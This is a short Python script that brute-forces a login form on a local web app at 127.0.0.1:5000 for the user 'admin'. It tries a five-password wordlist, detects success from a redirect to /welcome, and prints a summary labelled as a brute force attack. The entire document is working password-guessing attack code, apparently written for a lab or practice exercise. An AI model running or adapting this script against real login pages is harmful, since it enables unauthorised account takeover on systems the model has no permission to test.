import requests
import time

url = "http://127.0.0.1:5000/"
username = "admin"
wordlist = ["123456", "admin", "password", "admin123", "letmein"]

found = None
failed = []
attempts = 0
start = time.time()

for password in wordlist:
    attempts += 1
    data = {"username": username, "password": password}
    r = requests.post(url, data=data, allow_redirects=False)

    if r.status_code == 302 and "/welcome" in r.headers.get("Location", ""):
        found = password
        print(f"[+] Password found: {password}")
        break
    else:
        failed.append(password)
        print(f"[-] Failed: {password}")

elapsed = time.time() - start

print("\n" + "=" * 40)
print("        BRUTE FORCE ATTACK SUMMARY")
print("=" * 40)
print(f"  Target username : {username}")
print(f"  Total attempts  : {attempts}")
print(f"  Time taken      : {elapsed:.4f} seconds")
print("-" * 40)
print(f"  Failed passwords ({len(failed)}):")
for p in failed:
    print(f"    x {p}")
print("-" * 40)
if found:
    print(f"  Password cracked: {found}")
else:
    print("  Password not found in wordlist")
print("=" * 40)
